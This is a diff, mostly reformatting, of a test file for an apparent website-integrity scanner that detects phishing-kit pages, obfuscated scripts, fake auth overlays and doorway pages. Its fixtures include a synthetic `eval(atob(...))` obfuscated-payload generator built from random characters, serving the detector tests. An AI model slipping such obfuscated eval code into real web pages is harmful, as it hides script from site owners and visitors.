@@ -11,20 +11,18 @@
 // The correlation gating is the crux: the kit page fires multiple signals → high
 // severity (`fail`); the negatives fire zero or one → never `fail`.
 
-import { describe, expect, test } from "bun:test";
-
 import type { CheckResult } from "@squirrelscan/core-contracts";
 
 import { parsePage } from "@squirrelscan/parser";
+import { describe, expect, test } from "bun:test";
 
-import { expectDeclaredChecks } from "./helpers/declared-checks";
+import type { ParsedPage, Rule, RuleContext, SiteData } from "../src/types";
 
 import { brandImpersonationRule } from "../src/integrity/brand-impersonation";
 import { fakeAuthOverlayRule } from "../src/integrity/fake-auth-overlay";
 import { obfuscatedScriptRule } from "../src/integrity/obfuscated-script";
 import { orphanPageRule } from "../src/integrity/orphan-page";
 import { seoDoorwayRule } from "../src/integrity/seo-doorway";
-import { templateDiscontinuityRule } from "../src/integrity/template-discontinuity";
 import {
   detectPageSignals,
   detectBrandImpersonation,
@@ -32,7 +30,8 @@ import {
   detectFakeAuthOverlay,
   detectSeoDoorway,
 } from "../src/integrity/signals";
-import type { ParsedPage, Rule, RuleContext, SiteData } from "../src/types";
+import { templateDiscontinuityRule } from "../src/integrity/template-discontinuity";
+import { expectDeclaredChecks } from "./helpers/declared-checks";
 
 const SITE = "https://sydneyavspecialists.com.au";
 
@@ -59,9 +58,11 @@ const CLEAN_BODY = `<p>${Array.from({ length: 240 }, (_, i) => `audiovisual hire
 // A genuinely off-brand obfuscated inline payload: large, high-entropy, eval +
 // anti-tamper. Built from random-ish hex to push Shannon entropy high.
 function obfuscatedPayload(): string {
-  let s = 'var _0x1a2b=function(){return "the code has been tampered!";};eval(atob("';
+  let s =
+    'var _0x1a2b=function(){return "the code has been tampered!";};eval(atob("';
   // ~8KB of base64-ish high-entropy chars
-  const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+  const alphabet =
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
   let seed = 1337;
   for (let i = 0; i < 8200; i++) {
     seed = (seed * 1103515245 + 12345) & 0x7fffffff;
@@ -128,11 +129,7 @@ function pageEntry(
   return { url, statusCode, parsed: parsePage(html, url) };
 }
 
-function pageCtx(
-  url: string,
-  html: string,
-  site?: SiteData
-): RuleContext {
+function pageCtx(url: string, html: string, site?: SiteData): RuleContext {
   const parsed = parsePage(html, url);
   return {
     page: { url, html, statusCode: 200, loadTime: 0, headers: {}, parsed },
@@ -142,12 +139,15 @@ function pageCtx(
   };
 }
 
-function siteCtx(pages: SiteData["pages"], opts?: {
-  sitemapLocs?: string[];
-  entryUrls?: string[];
-  options?: Record<string, unknown>;
-  crawlLimits?: { pagesCrawled: number; maxPages: number };
-}): RuleContext {
+function siteCtx(
+  pages: SiteData["pages"],
+  opts?: {
+    sitemapLocs?: string[];
+    entryUrls?: string[];
+    options?: Record<string, unknown>;
+    crawlLimits?: { pagesCrawled: number; maxPages: number };
+  }
+): RuleContext {
   const site: SiteData = {
     baseUrl: SITE,
     pages,
@@ -195,7 +195,9 @@ function siteCtx(pages: SiteData["pages"], opts?: {
 async function run(rule: Rule, ctx: RuleContext): Promise<CheckResult[]> {
   const schema = rule.meta.optionsSchema;
   const options = schema ? schema.parse(ctx.options ?? {}) : ctx.options;
-  const out = ((await rule.run({ ...ctx, options })) as { checks: CheckResult[] }).checks;
+  const out = (
+    (await rule.run({ ...ctx, options })) as { checks: CheckResult[] }
+  ).checks;
   expectDeclaredChecks(rule, out);
   return out;
 }
@@ -204,7 +206,9 @@ function find(checks: CheckResult[], name: string): CheckResult | undefined {
 }
 // A finding: a pass or a skip is the rule saying "clean" or "not evaluated" (#1741), not a finding.
 function finding(checks: CheckResult[], name: string): CheckResult | undefined {
-  return checks.find((c) => c.name === name && c.status !== "pass" && c.status !== "skipped");
+  return checks.find(
+    (c) => c.name === name && c.status !== "pass" && c.status !== "skipped"
+  );
 }
 
 // Build a realistic site: 4 clean themed pages + the kit + the doorway.
@@ -256,30 +260,32 @@ describe("integrity/signals — individual detectors", () => {
 
 describe("integrity/brand-impersonation", () => {
   test("kit page → fail (>=2 corroborating signals)", async () => {
-    const checks = (await run(
+    const checks = await run(
       brandImpersonationRule,
       pageCtx(`${SITE}/calendly`, kitPageHtml())
-    ));
+    );
     const c = finding(checks, "brand-impersonation");
     expect(c?.status).toBe("fail");
     expect(c?.details?.escalated).toBe(true);
   });
 
   test("legit Calendly integration page → no finding", async () => {
-    const checks = (await run(
+    const checks = await run(
       brandImpersonationRule,
       pageCtx(`${SITE}/integrations`, legitCalendlyPageHtml())
-    ));
+    );
     expect(finding(checks, "brand-impersonation")).toBeUndefined();
   });
 
   test("clean themed page → no finding, and a clean check (#1741)", async () => {
-    const checks = (await run(
+    const checks = await run(
       brandImpersonationRule,
       pageCtx(`${SITE}/about`, themed("About", CLEAN_BODY))
-    ));
+    );
     expect(finding(checks, "brand-impersonation")).toBeUndefined();
-    expect(checks.map((c) => [c.name, c.status])).toEqual([["brand-impersonation", "pass"]]);
+    expect(checks.map((c) => [c.name, c.status])).toEqual([
+      ["brand-impersonation", "pass"],
+    ]);
   });
 
   test("a clean page is never an empty list for any page-scope integrity rule (#1741)", async () => {
@@ -290,9 +296,12 @@ describe("integrity/brand-impersonation", () => {
       obfuscatedScriptRule,
       seoDoorwayRule,
     ]) {
-      const out = (await run(rule, ctx));
+      const out = await run(rule, ctx);
       expect(out.length, rule.meta.id).toBeGreaterThan(0);
-      expect(out.every((c) => c.status === "pass"), rule.meta.id).toBe(true);
+      expect(
+        out.every((c) => c.status === "pass"),
+        rule.meta.id
+      ).toBe(true);
     }
   });
 
@@ -305,7 +314,10 @@ describe("integrity/brand-impersonation", () => {
     const ctx = pageCtx(`${SITE}/x`, html);
     const signals = detectPageSignals(ctx);
     expect(signals.size).toBe(1);
-    const c = finding(await run(brandImpersonationRule, ctx), "brand-impersonation");
+    const c = finding(
+      await run(brandImpersonationRule, ctx),
+      "brand-impersonation"
+    );
     expect(c?.status).toBe("info");
     expect(c?.details?.escalated).toBe(false);
   });
@@ -316,7 +328,10 @@ describe("integrity/brand-impersonation", () => {
 describe("integrity/obfuscated-script", () => {
   test("kit page → fail (corroborated)", async () => {
     const c = finding(
-      (await run(obfuscatedScriptRule, pageCtx(`${SITE}/calendly`, kitPageHtml()))),
+      await run(
+        obfuscatedScriptRule,
+        pageCtx(`${SITE}/calendly`, kitPageHtml())
+      ),
       "obfuscated-script"
     );
     expect(c?.status).toBe("fail");
@@ -324,7 +339,10 @@ describe("integrity/obfuscated-script", () => {
 
   test("clean themed page with normal scripts → no finding", async () => {
     const c = finding(
-      (await run(obfuscatedScriptRule, pageCtx(`${SITE}/about`, themed("About", CLEAN_BODY)))),
+      await run(
+        obfuscatedScriptRule,
+        pageCtx(`${SITE}/about`, themed("About", CLEAN_BODY))
+      ),
       "obfuscated-script"
     );
     expect(c).toBeUndefined();
@@ -335,7 +353,7 @@ describe("integrity/obfuscated-script", () => {
       <script>${obfuscatedPayload()}</script></head>
       <body><p>${CLEAN_BODY}</p></body></html>`;
     const c = finding(
-      (await run(obfuscatedScriptRule, pageCtx(`${SITE}/x`, html))),
+      await run(obfuscatedScriptRule, pageCtx(`${SITE}/x`, html)),
       "obfuscated-script"
     );
     expect(c?.status).toBe("info");
@@ -347,7 +365,10 @@ describe("integrity/obfuscated-script", () => {
 describe("integrity/fake-auth-overlay", () => {
   test("kit page full-viewport #google-auth iframe → fail (corroborated)", async () => {
     const c = finding(
-      (await run(fakeAuthOverlayRule, pageCtx(`${SITE}/calendly`, kitPageHtml()))),
+      await run(
+        fakeAuthOverlayRule,
+        pageCtx(`${SITE}/calendly`, kitPageHtml())
+      ),
       "fake-auth-overlay"
     );
     expect(c?.status).toBe("fail");
@@ -359,7 +380,7 @@ describe("integrity/fake-auth-overlay", () => {
       `${CLEAN_BODY}<iframe style="position:fixed;bottom:0;left:0;width:100%;height:60px;z-index:5" src="https://cdn.sydneyav.com/cookie.html"></iframe>`
     );
     const c = finding(
-      (await run(fakeAuthOverlayRule, pageCtx(`${SITE}/`, html))),
+      await run(fakeAuthOverlayRule, pageCtx(`${SITE}/`, html)),
       "fake-auth-overlay"
     );
     expect(c).toBeUndefined();
@@ -371,7 +392,7 @@ describe("integrity/fake-auth-overlay", () => {
 describe("integrity/seo-doorway", () => {
   test("doorway page → finding", async () => {
     const c = finding(
-      (await run(seoDoorwayRule, pageCtx(`${SITE}/blog/x`, doorwayPageHtml()))),
+      await run(seoDoorwayRule, pageCtx(`${SITE}/blog/x`, doorwayPageHtml())),
       "seo-doorway"
     );
     expect(c).toBeDefined();
@@ -379,7 +400,10 @@ describe("integrity/seo-doorway", () => {
 
   test("legit Calendly page → no doorway finding", async () => {
     const c = finding(
-      (await run(seoDoorwayRule, pageCtx(`${SITE}/integrations`, legitCalendlyPageHtml()))),
+      await run(
+        seoDoorwayRule,
+        pageCtx(`${SITE}/integrations`, legitCalendlyPageHtml())
+      ),
       "seo-doorway"
     );
     expect(c).toBeUndefined();
@@ -392,7 +416,7 @@ describe("integrity/seo-doorway", () => {
        <p>This post contains affiliate links (affiliate disclosure).</p></article>`
     );
     const c = finding(
-      (await run(seoDoorwayRule, pageCtx(`${SITE}/blog/review`, html))),
+      await run(seoDoorwayRule, pageCtx(`${SITE}/blog/review`, html)),
       "seo-doorway"
     );
     expect(c).toBeUndefined();
@@ -408,7 +432,10 @@ describe("integrity/template-discontinuity", () => {
     // a similarity score plus a heuristic, which is enough to ask someone to
     // look and not enough to zero a category.
     const ctx = siteCtx(fullSitePages());
-    const c = find(await run(templateDiscontinuityRule, ctx), "template-discontinuity");
+    const c = find(
+      await run(templateDiscontinuityRule, ctx),
+      "template-discontinuity"
+    );
     expect(c?.status).toBe("warn");
     const outliers = (c?.details?.outliers as { url: string }[]) ?? [];
     expect(outliers.some((o) => o.url.includes("/calendly"))).toBe(true);
@@ -437,11 +464,18 @@ describe("integrity/template-discontinuity", () => {
       pageEntry(`${SITE}/contact`, themed("Contact", CLEAN_BODY)),
       pageEntry(`${SITE}/account/items`, signedOut),
     ];
-    const checks = (await run(templateDiscontinuityRule, siteCtx(pages)));
-    expect(checks.find((c) => c.name === "template-discontinuity")).toBeUndefined();
+    const checks = await run(templateDiscontinuityRule, siteCtx(pages));
+    expect(
+      checks.find((c) => c.name === "template-discontinuity")
+    ).toBeUndefined();
     const review = find(checks, "template-discontinuity-review");
     expect(review?.status).toBe("info");
-    const outliers = (review?.details?.outliers as { url: string; loadsSiteAssets: boolean; signals: number }[]) ?? [];
+    const outliers =
+      (review?.details?.outliers as {
+        url: string;
+        loadsSiteAssets: boolean;
+        signals: number;
+      }[]) ?? [];
     const page = outliers.find((o) => o.url.includes("/account/items"));
     // It carries a signal AND it is still not escalated: the assets are why.
     expect(page?.signals).toBeGreaterThanOrEqual(1);
@@ -466,14 +500,21 @@ describe("integrity/template-discontinuity", () => {
       pageEntry(`${SITE}/contact`, themed("Contact", CLEAN_BODY)),
       pageEntry(`${SITE}/account/items`, standalone),
     ];
-    const c = find(await run(templateDiscontinuityRule, siteCtx(pages)), "template-discontinuity");
+    const c = find(
+      await run(templateDiscontinuityRule, siteCtx(pages)),
+      "template-discontinuity"
+    );
     expect(c?.status).toBe("warn");
-    const outliers = (c?.details?.outliers as { loadsSiteAssets: boolean }[]) ?? [];
+    const outliers =
+      (c?.details?.outliers as { loadsSiteAssets: boolean }[]) ?? [];
     expect(outliers[0]?.loadsSiteAssets).toBe(false);
   });
 
   test("the finding does not assert that the page is injected", async () => {
-    const c = find(await run(templateDiscontinuityRule, siteCtx(fullSitePages())), "template-discontinuity");
+    const c = find(
+      await run(templateDiscontinuityRule, siteCtx(fullSitePages())),
+      "template-discontinuity"
+    );
     expect(c?.message).not.toMatch(/injected|compromise signals/i);
     expect(c?.message).toContain("share none of the site's assets");
   });
@@ -483,9 +524,9 @@ describe("integrity/template-discontinuity", () => {
     // The compromise instruction must be reached only through a condition, and
     // the condition has to come first.
     expect(solution).toContain("confirming the page is one you published");
-    expect(solution.indexOf("confirming the page is one you published")).toBeLessThan(
-      solution.indexOf("treat the site as compromised")
-    );
+    expect(
+      solution.indexOf("confirming the page is one you published")
+    ).toBeLessThan(solution.indexOf("treat the site as compromised"));
     expect(solution).toContain("only then");
   });
 
@@ -497,7 +538,7 @@ describe("integrity/template-discontinuity", () => {
       pageEntry(`${SITE}/contact`, themed("Contact", CLEAN_BODY)),
     ];
     const c = find(
-      (await run(templateDiscontinuityRule, siteCtx(pages))),
+      await run(templateDiscontinuityRule, siteCtx(pages)),
       "template-discontinuity"
     );
     expect(c?.status).toBe("pass");
@@ -506,7 +547,7 @@ describe("integrity/template-discontinuity", () => {
   test("too few pages → skipped", async () => {
     const pages = [pageEntry(`${SITE}/`, themed("Home", CLEAN_BODY))];
     const c = find(
-      (await run(templateDiscontinuityRule, siteCtx(pages))),
+      await run(templateDiscontinuityRule, siteCtx(pages)),
       "template-discontinuity"
     );
     expect(c?.status).toBe("skipped");
@@ -525,13 +566,25 @@ describe("integrity/orphan-page", () => {
       <script>${obfuscatedPayload()}</script></head><body><p>Sign in</p></body></html>`;
     const pages = [
       pageEntry(landing, html),
-      pageEntry(`${SITE}/help`, themed("Help", `${CLEAN_BODY}<a href="/privacy">Privacy</a>`)),
-      pageEntry(`${SITE}/privacy`, themed("Privacy", `${CLEAN_BODY}<a href="/help">Help</a>`)),
+      pageEntry(
+        `${SITE}/help`,
+        themed("Help", `${CLEAN_BODY}<a href="/privacy">Privacy</a>`)
+      ),
+      pageEntry(
+        `${SITE}/privacy`,
+        themed("Privacy", `${CLEAN_BODY}<a href="/help">Help</a>`)
+      ),
     ];
-    const control = find(await run(orphanPageRule, siteCtx(pages)), "orphan-page");
+    const control = find(
+      await run(orphanPageRule, siteCtx(pages)),
+      "orphan-page"
+    );
     expect(control?.status).toBe("fail");
     expect((control?.items ?? []).map((i) => i.id)).toEqual([landing]);
-    const result = (await run(orphanPageRule, siteCtx(pages, { entryUrls: [landing, `${SITE}/`] })));
+    const result = await run(
+      orphanPageRule,
+      siteCtx(pages, { entryUrls: [landing, `${SITE}/`] })
+    );
     expect(find(result, "orphan-page")?.status).toBe("pass");
     expect(find(result, "orphan-page-review")).toBeUndefined();
   });
@@ -546,7 +599,7 @@ describe("integrity/orphan-page", () => {
       `${SITE}/contact`,
     ];
     const c = find(
-      (await run(orphanPageRule, siteCtx(pages, { sitemapLocs }))),
+      await run(orphanPageRule, siteCtx(pages, { sitemapLocs })),
       "orphan-page"
     );
     expect(c?.status).toBe("fail");
@@ -556,28 +609,48 @@ describe("integrity/orphan-page", () => {
 
   // #1760: a truncated or partly read sitemap cannot prove a page is unlisted, so the
   // hidden page is review-only, never escalated toward "likely injected".
-  for (const state of [{ truncated: true }, { readState: "partial" as const }, { readState: "unreadable" as const }]) {
+  for (const state of [
+    { truncated: true },
+    { readState: "partial" as const },
+    { readState: "unreadable" as const },
+  ]) {
     test(`incomplete sitemap corpus (${JSON.stringify(state)}) never escalates a hidden page`, async () => {
       const pages = fullSitePages();
-      const sitemapLocs = [`${SITE}/`, `${SITE}/services`, `${SITE}/about`, `${SITE}/contact`];
+      const sitemapLocs = [
+        `${SITE}/`,
+        `${SITE}/services`,
+        `${SITE}/about`,
+        `${SITE}/contact`,
+      ];
       const ctx = siteCtx(pages, { sitemapLocs });
       Object.assign(ctx.site!.sitemaps!, state);
       const checks = await run(orphanPageRule, ctx);
-      expect(checks.find((c) => c.name === "orphan-page" && c.status === "fail")).toBeUndefined();
+      expect(
+        checks.find((c) => c.name === "orphan-page" && c.status === "fail")
+      ).toBeUndefined();
       const review = find(checks, "orphan-page-review");
       expect(review?.status).toBe("info");
-      expect((review?.items ?? []).some((i) => i.id.includes("/calendly"))).toBe(true);
+      expect(
+        (review?.items ?? []).some((i) => i.id.includes("/calendly"))
+      ).toBe(true);
     });
   }
 
   // #1869: a sitemap whose read state was never recorded is unknown, not complete.
   test("absent readState never escalates a hidden page", async () => {
     const pages = fullSitePages();
-    const sitemapLocs = [`${SITE}/`, `${SITE}/services`, `${SITE}/about`, `${SITE}/contact`];
+    const sitemapLocs = [
+      `${SITE}/`,
+      `${SITE}/services`,
+      `${SITE}/about`,
+      `${SITE}/contact`,
+    ];
     const ctx = siteCtx(pages, { sitemapLocs });
     delete ctx.site!.sitemaps!.readState;
     const checks = await run(orphanPageRule, ctx);
-    expect(checks.find((c) => c.name === "orphan-page" && c.status === "fail")).toBeUndefined();
+    expect(
+      checks.find((c) => c.name === "orphan-page" && c.status === "fail")
+    ).toBeUndefined();
     expect(find(checks, "orphan-page-review")?.status).toBe("info");
   });
 
@@ -593,7 +666,7 @@ describe("integrity/orphan-page", () => {
     ];
     const sitemapLocs = [`${SITE}/`, `${SITE}/services`, `${SITE}/about`];
     const c = find(
-      (await run(orphanPageRule, siteCtx(pages, { sitemapLocs }))),
+      await run(orphanPageRule, siteCtx(pages, { sitemapLocs })),
       "orphan-page"
     );
     expect(c?.status).toBe("pass");
@@ -613,7 +686,7 @@ describe("integrity/orphan-page", () => {
       pageEntry(`${SITE}/about`, themed("About", CLEAN_BODY)),
       pageEntry(`${SITE}/calendly?token=ey4m`, kitPageHtml()), // hidden, signals
     ];
-    const checks = (await run(orphanPageRule, siteCtx(pages))); // no sitemapLocs → hasSitemap=false
+    const checks = await run(orphanPageRule, siteCtx(pages)); // no sitemapLocs → hasSitemap=false
     const c = find(checks, "orphan-page");
     expect(c?.status).toBe("fail");
     expect((c?.items ?? []).some((i) => i.id.includes("/calendly"))).toBe(true);
@@ -626,7 +699,12 @@ describe("integrity/orphan-page", () => {
 describe("integrity — incident corpus end-to-end", () => {
   test("kit page produces at least 3 fail-level integrity findings across rules", async () => {
     const site = siteCtx(fullSitePages(), {
-      sitemapLocs: [`${SITE}/`, `${SITE}/services`, `${SITE}/about`, `${SITE}/contact`],
+      sitemapLocs: [
+        `${SITE}/`,
+        `${SITE}/services`,
+        `${SITE}/about`,
+        `${SITE}/contact`,
+      ],
     }).site!;
     const kitCtx = pageCtx(`${SITE}/calendly?token=ey4m`, kitPageHtml(), site);
 
@@ -639,11 +717,18 @@ describe("integrity — incident corpus end-to-end", () => {
 
     // Site-scope rules also flag it.
     const siteCtxFull = siteCtx(fullSitePages(), {
-      sitemapLocs: [`${SITE}/`, `${SITE}/services`, `${SITE}/about`, `${SITE}/contact`],
+      sitemapLocs: [
+        `${SITE}/`,
+        `${SITE}/services`,
+        `${SITE}/about`,
+        `${SITE}/contact`,
+      ],
     });
     expect(
-      find(await run(templateDiscontinuityRule, siteCtxFull), "template-discontinuity")
-        ?.status
+      find(
+        await run(templateDiscontinuityRule, siteCtxFull),
+        "template-discontinuity"
+      )?.status
     ).toBe("warn"); // #2233: escalated, but a warning rather than a failure
     expect(
       find(await run(orphanPageRule, siteCtxFull), "orphan-page")?.status
@@ -656,7 +741,11 @@ describe("integrity — incident corpus end-to-end", () => {
       pageEntry(`${SITE}/integrations`, legitCalendlyPageHtml()),
       pageEntry(`${SITE}/about`, themed("About", CLEAN_BODY)),
     ]).site!;
-    const legitCtx = pageCtx(`${SITE}/integrations`, legitCalendlyPageHtml(), site);
+    const legitCtx = pageCtx(
+      `${SITE}/integrations`,
+      legitCalendlyPageHtml(),
+      site
+    );
 
     const allFindings = [
       ...(await run(brandImpersonationRule, legitCtx)),
@@ -757,24 +846,31 @@ describe("integrity — false-positive regressions", () => {
       pageEntry(`${SITE}/contact`, themed("Contact", CLEAN_BODY)),
       pageEntry(`${SITE}/promo`, landing),
     ];
-    const checks = (await run(templateDiscontinuityRule, siteCtx(pages)));
+    const checks = await run(templateDiscontinuityRule, siteCtx(pages));
     // No fail-level finding (the outlier carries no page-level signals).
-    expect(checks.find((c) => c.name === "template-discontinuity")).toBeUndefined();
+    expect(
+      checks.find((c) => c.name === "template-discontinuity")
+    ).toBeUndefined();
     const review = find(checks, "template-discontinuity-review");
     expect(review?.status).toBe("info");
-    expect((review?.items ?? []).some((i) => i.id.includes("/promo"))).toBe(true);
+    expect((review?.items ?? []).some((i) => i.id.includes("/promo"))).toBe(
+      true
+    );
   });
 
   // Finding 3b: a hidden page with no compromise signals → orphan-page-review
   // info, not fail.
   test("legit hidden page (no signals) → orphan-page info, not fail", async () => {
     const pages = [
-      pageEntry(`${SITE}/`, themed("Home", `${CLEAN_BODY}<a href="/about">About</a>`)),
+      pageEntry(
+        `${SITE}/`,
+        themed("Home", `${CLEAN_BODY}<a href="/about">About</a>`)
+      ),
       pageEntry(`${SITE}/about`, themed("About", CLEAN_BODY)),
       pageEntry(`${SITE}/unlisted`, themed("Unlisted Page", CLEAN_BODY)), // hidden, clean
     ];
     const sitemapLocs = [`${SITE}/`, `${SITE}/about`];
-    const checks = (await run(orphanPageRule, siteCtx(pages, { sitemapLocs })));
+    const checks = await run(orphanPageRule, siteCtx(pages, { sitemapLocs }));
     expect(checks.find((c) => c.name === "orphan-page")).toBeUndefined();
     const review = find(checks, "orphan-page-review");
     expect(review?.status).toBe("info");
@@ -1102,7 +1198,10 @@ type ProbeOutlier = {
 async function probe(
   theme: (title: string) => string,
   oddHtml: string,
-  opts?: { crawlLimits?: { pagesCrawled: number; maxPages: number }; themedPages?: number }
+  opts?: {
+    crawlLimits?: { pagesCrawled: number; maxPages: number };
+    themedPages?: number;
+  }
 ): Promise<ProbeOutlier | undefined> {
   const n = opts?.themedPages ?? 4;
   const pages = [
@@ -1111,25 +1210,27 @@ async function probe(
     ),
     pageEntry(`${PSITE}/odd`, oddHtml),
   ];
-  const checks = (await run(
+  const checks = await run(
     templateDiscontinuityRule,
     siteCtx(pages, { crawlLimits: opts?.crawlLimits })
-  ));
+  );
   const rows = [
-    ...((find(checks, "template-discontinuity")?.details?.outliers as ProbeOutlier[]) ?? []),
-    ...((find(checks, "template-discontinuity-review")?.details?.outliers as ProbeOutlier[]) ?? []),
+    ...((find(checks, "template-discontinuity")?.details
+      ?.outliers as ProbeOutlier[]) ?? []),
+    ...((find(checks, "template-discontinuity-review")?.details
+      ?.outliers as ProbeOutlier[]) ?? []),
   ];
   return rows.find((o) => o.url.endsWith("/odd"));
 }
 
 describe("integrity/template-discontinuity: the site's own assets", () => {
   test("a stylesheet or script from a site resource host still vetoes escalation", async () => {
-    const row = (await probe(
+    const row = await probe(
       pThemed,
       oddPage(
         `<link rel="stylesheet" href="https://kit-cdn.tk/lp.css"><script src="${PCDN}/theme/app.js"></script>`
       )
-    ));
+    );
     expect(row).toBeDefined();
     expect(row?.signals).toBeGreaterThanOrEqual(1);
     expect(row?.loadsSiteAssets).toBe(true);
@@ -1137,73 +1238,73 @@ describe("integrity/template-discontinuity: the site's own assets", () => {
   });
 
   test("probe a: hotlinking one of the site's own stylesheets still vetoes", async () => {
-    const row = (await probe(
+    const row = await probe(
       pThemed,
       oddPage(
         `<link rel="stylesheet" href="${PCDN}/theme/style.css"><link rel="stylesheet" href="https://kit-cdn.tk/lp.css">`
       )
-    ));
+    );
     expect(row).toBeDefined();
     expect(row?.loadsSiteAssets).toBe(true);
     expect(row?.escalated).toBe(false);
   });
 
   test("probe a3: a font CDN both pages use is not the site's own asset", async () => {
-    const row = (await probe(
+    const row = await probe(
       pThemed,
       oddPage(
         `<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto"><link rel="stylesheet" href="https://kit-cdn.tk/lp.css">`
       )
-    ));
+    );
     expect(row).toBeDefined();
     expect(row?.loadsSiteAssets).toBe(false);
     expect(row?.escalated).toBe(true);
   });
 
   test("probe a4: a canonical pointing at the site is not an asset", async () => {
-    const row = (await probe(
+    const row = await probe(
       pThemedSameOrigin,
       oddPage(
         `<link rel="canonical" href="${PSITE}/odd"><link rel="stylesheet" href="https://kit-cdn.tk/lp.css">`
       )
-    ));
+    );
     expect(row).toBeDefined();
     expect(row?.loadsSiteAssets).toBe(false);
     expect(row?.escalated).toBe(true);
   });
 
   test("probe a5: a favicon on the site's own host is not an asset", async () => {
-    const row = (await probe(
+    const row = await probe(
       pThemedSameOrigin,
       oddPage(
         `<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="https://kit-cdn.tk/lp.css">`
       )
-    ));
+    );
     expect(row).toBeDefined();
     expect(row?.loadsSiteAssets).toBe(false);
     expect(row?.escalated).toBe(true);
   });
 
   test("a preconnect to the site's own host is not an asset either", async () => {
-    const row = (await probe(
+    const row = await probe(
       pThemedSameOrigin,
       oddPage(
         `<link rel="preconnect" href="${PSITE}"><link rel="stylesheet" href="https://kit-cdn.tk/lp.css">`
       )
-    ));
+    );
     expect(row).toBeDefined();
     expect(row?.loadsSiteAssets).toBe(false);
     expect(row?.escalated).toBe(true);
   });
 
   test("an image from a site resource host is not enough on its own", async () => {
-    const row = (await probe(
+    const row = await probe(
       pThemed,
       oddPage(
         `<link rel="stylesheet" href="https://kit-cdn.tk/lp.css">`,
         `<img src="${PCDN}/logo.png" alt="logo">`
       )
-    ));
+    );
     expect(row).toBeDefined();
     expect(row?.loadsSiteAssets).toBe(false);
     expect(row?.escalated).toBe(true);
@@ -1214,10 +1315,10 @@ describe("integrity/template-discontinuity: the site's own assets", () => {
   // that it might connect to it; it never loaded a byte from it. A page loading
   // a script from there shares nothing the site actually serves.
   test("a host the site only preconnects to is not one of its asset hosts", async () => {
-    const row = (await probe(
+    const row = await probe(
       pThemedWithPreconnect,
       oddPage(`<script src="https://preconnect-only.test/x.js"></script>`)
-    ));
+    );
     expect(row).toBeDefined();
     expect(row?.loadsSiteAssets).toBe(false);
     expect(row?.escalated).toBe(true);
@@ -1227,10 +1328,10 @@ describe("integrity/template-discontinuity: the site's own assets", () => {
   // loads a DIFFERENT file from the site's CDN, so the exact-href arm cannot fire
   // and the host arm is the only thing that can veto it.
   test("a stylesheet from a site resource host vetoes on the host alone", async () => {
-    const row = (await probe(
+    const row = await probe(
       pThemed,
       oddPage(`<link rel="stylesheet" href="${PCDN}/theme/checkout-only.css">`)
-    ));
+    );
     expect(row).toBeDefined();
     expect(row?.signals).toBeGreaterThanOrEqual(1);
     expect(row?.loadsSiteAssets).toBe(true);
@@ -1242,10 +1343,12 @@ describe("integrity/template-discontinuity: the site's own assets", () => {
   // is indistinguishable from a foreign one by asset evidence; the veto cannot
   // see the difference and neither can anything else this rule has.
   test("probe b: a first-party host the rest of the crawl never uses reads as foreign", async () => {
-    const row = (await probe(
+    const row = await probe(
       pThemed,
-      oddPage(`<link rel="stylesheet" href="https://assets2.example-site.test/lp.css">`)
-    ));
+      oddPage(
+        `<link rel="stylesheet" href="https://assets2.example-site.test/lp.css">`
+      )
+    );
     expect(row).toBeDefined();
     expect(row?.loadsSiteAssets).toBe(false);
     expect(row?.escalated).toBe(true);
@@ -1255,16 +1358,16 @@ describe("integrity/template-discontinuity: the site's own assets", () => {
   // public CDN, so it still counts as the site's: a page loading from it is
   // vetoed, and one that does not is escalated.
   test("probe d: a site's own third-party CDN still counts as the site's", async () => {
-    const shares = (await probe(
+    const shares = await probe(
       pThemedThirdParty,
       oddPage(`<script src="${PTHIRD}/theme/app.js"></script>`)
-    ));
+    );
     expect(shares?.escalated).not.toBe(true);
 
-    const doesNot = (await probe(
+    const doesNot = await probe(
       pThemedThirdParty,
       oddPage(`<link rel="stylesheet" href="https://kit-cdn.tk/lp.css">`)
-    ));
+    );
     expect(doesNot).toBeDefined();
     expect(doesNot?.loadsSiteAssets).toBe(false);
     expect(doesNot?.escalated).toBe(true);
@@ -1274,10 +1377,12 @@ describe("integrity/template-discontinuity: the site's own assets", () => {
   // baseline's resource hosts. Sharing it must still not buy a veto, and the
   // list is matched on subdomains, not just the bare host.
   test("a subdomain of a shared public CDN is shared even when the theme uses it", async () => {
-    const row = (await probe(
+    const row = await probe(
       pThemedWithPublicCdn,
-      oddPage(`<script src="https://cdn.jsdelivr.net/npm/x/dist/x.js"></script>`)
-    ));
+      oddPage(
+        `<script src="https://cdn.jsdelivr.net/npm/x/dist/x.js"></script>`
+      )
+    );
     expect(row).toBeDefined();
     expect(row?.loadsSiteAssets).toBe(false);
     expect(row?.escalated).toBe(true);
@@ -1291,10 +1396,10 @@ describe("integrity/template-discontinuity: capped crawls", () => {
     oddPage(`<link rel="stylesheet" href="https://kit-cdn.tk/lp.css">`);
 
   test("a crawl that stopped at its page limit with a thin baseline does not escalate", async () => {
-    const row = (await probe(pThemed, foreign(), {
+    const row = await probe(pThemed, foreign(), {
       themedPages: 9,
       crawlLimits: { pagesCrawled: 10, maxPages: 10 },
-    }));
+    });
     expect(row).toBeDefined();
     // Everything else about it says escalate; only the cap holds it back.
     expect(row?.signals).toBeGreaterThanOrEqual(1);
@@ -1304,52 +1409,58 @@ describe("integrity/template-discontinuity: capped crawls", () => {
 
   test("the same crawl reports the page for review, and says why it stopped there", async () => {
     const pages = [
-      ...Array.from({ length: 9 }, (_, i) => pageEntry(`${PSITE}/p${i}`, pThemed(`Page ${i}`))),
+      ...Array.from({ length: 9 }, (_, i) =>
+        pageEntry(`${PSITE}/p${i}`, pThemed(`Page ${i}`))
+      ),
       pageEntry(`${PSITE}/odd`, foreign()),
     ];
-    const checks = (await run(
+    const checks = await run(
       templateDiscontinuityRule,
       siteCtx(pages, { crawlLimits: { pagesCrawled: 10, maxPages: 10 } })
-    ));
+    );
     expect(find(checks, "template-discontinuity")).toBeUndefined();
     const review = find(checks, "template-discontinuity-review");
     expect(review?.status).toBe("info");
-    expect(review?.details?.escalationWithheld).toBe("capped_crawl_small_baseline");
+    expect(review?.details?.escalationWithheld).toBe(
+      "capped_crawl_small_baseline"
+    );
   });
 
   test("the same page on an uncapped crawl of the same size IS escalated", async () => {
-    const row = (await probe(pThemed, foreign(), { themedPages: 9 }));
